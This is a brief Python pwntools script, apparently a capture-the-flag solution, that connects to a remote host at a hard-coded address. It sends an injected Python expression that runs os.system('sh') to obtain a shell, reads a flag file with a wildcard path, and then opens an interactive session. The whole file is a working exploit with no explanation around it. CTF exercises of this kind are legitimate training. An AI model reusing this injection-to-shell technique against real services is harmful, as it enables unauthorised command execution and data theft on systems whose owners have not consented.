from pwn import *

p = remote("133.130.98.59", 1004)
p.sendline("__import__('os').system('sh')")
print p.recv()
p.sendline("cat /*/*/flag")
print p.recv()
p.interactive()
